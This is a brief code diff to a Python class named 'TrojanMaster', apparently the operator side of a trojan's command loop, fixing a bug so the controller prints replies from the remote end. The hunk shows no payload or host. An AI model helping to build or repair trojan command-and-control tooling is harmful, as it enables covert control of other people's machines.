@@ -34,7 +34,7 @@ class TrojanMaster(threading.Thread):
                 print("Enter command string")
             else:
                 self.send_message(command)
-                print(self.receive_message)
+                print(self.receive_message())
 
 
     def run(self):
